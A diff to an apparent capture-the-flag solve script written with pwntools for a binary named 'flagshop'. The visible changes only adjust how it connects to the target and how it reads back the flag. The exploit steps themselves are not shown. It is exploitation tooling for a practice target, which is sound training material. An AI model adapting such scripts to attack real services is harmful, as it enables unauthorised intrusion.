@@ -1,11 +1,14 @@
 from pwn import *
+import os
 
 context.log_level = "warning"
-exe = context.binary = ELF("flagshop")
+exe = context.binary = ELF(".build/flagshop" if os.path.exists(".build/flagshop") else "flagshop")
 
 
-if args.REMOTE:
-	r = remote(args.HOST or "127.0.0.1", int(args.PORT or 24001))
+HOST = os.environ.get("HOST")
+PORT = os.environ.get("PORT")
+if HOST or args.REMOTE:
+	r = remote(HOST or args.HOST or "127.0.0.1", int(PORT or args.PORT or 24001))
 elif args.DEBUG:
 	r = exe.debug()
 else:
@@ -28,7 +31,6 @@ r.recvuntil(b"==========================================")
 r.sendline(b"1")
 
 print(f"[ FLAG Should Be Displayed Below ]: ")
-print(r.recv().decode("utf8").strip().rstrip())
+# load_panel prints the flag then exit(0)s, so drain until the connection closes
+print(r.recvall(timeout=5).decode("utf8", errors="replace").strip())
 
-r.interactive()
-input()
